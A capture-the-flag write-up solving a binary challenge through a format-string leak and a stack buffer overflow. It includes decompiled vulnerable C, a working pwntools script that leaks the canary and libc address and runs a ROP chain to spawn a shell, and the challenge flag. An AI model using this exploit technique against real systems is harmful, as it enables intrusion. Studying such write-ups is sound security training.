# pwn/warmup

## Description

Can you help find the canary?

> nc chall.nitdgplug.org 30091

Downloads:
[chall](chall)
[libc.so.6](libc.so.6)

## Solution

For this challenge we are given a binary as well as its libc.
The following security mechanisms are enabled:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

First of all I took a look in ghidra:

```c
void vuln() {
  char local_98 [64];
  char local_58 [72];
  
  puts("Can you help find the Canary ?");
  fgets(local_98, 64, stdin);
  printf(local_98);

  fflush(stdout);

  gets(local_58);
  puts(local_58);

  return;
``` 

We have two vulnerabilites here: a format string vulnerability as well a buffer overflow. With the buffer overflow I
leak a libc address as well as the stack canary. With the buffer overflow I then write my ROP chain and get a shell.


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
libc = ELF('./libc.so.6')

io = remote('chall.nitdgplug.org', 30091)

io.recvline()
io.sendline(b'%23$p %27$p')

leak = io.recvline()[:-1]
leak = leak.split(b' ')

canary = int(leak[0][2:].decode("utf-8"), 16)
libc_addr = int(leak[1][2:].decode("utf-8"), 16)

libc.address = libc_addr - libc.libc_start_main_return

rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(libc.search(b'/bin/sh')))
payload = flat(72 * "A", canary, rop.chain())

io.sendline(payload)
io.interactive()
```

I had to add two `ret`s in my ROP chain since it wouldn't work otherwise on the remote service. This gives the flag
`GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}`.

